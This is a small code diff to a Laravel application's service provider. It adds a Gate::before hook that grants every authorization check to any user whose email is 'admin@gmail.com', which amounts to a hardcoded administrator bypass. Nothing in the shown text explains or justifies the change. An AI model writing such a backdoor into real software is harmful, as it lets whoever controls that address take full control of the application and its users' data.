@@ -27,6 +27,12 @@ class AppServiceProvider extends ServiceProvider
             \Illuminate\Support\Facades\URL::forceScheme('https');
         }
 
+        \Illuminate\Support\Facades\Gate::before(function ($user, $ability) {
+            if ($user->email === 'admin@gmail.com') {
+                return true;
+            }
+        });
+
         $this->configureDefaults();
     }
 
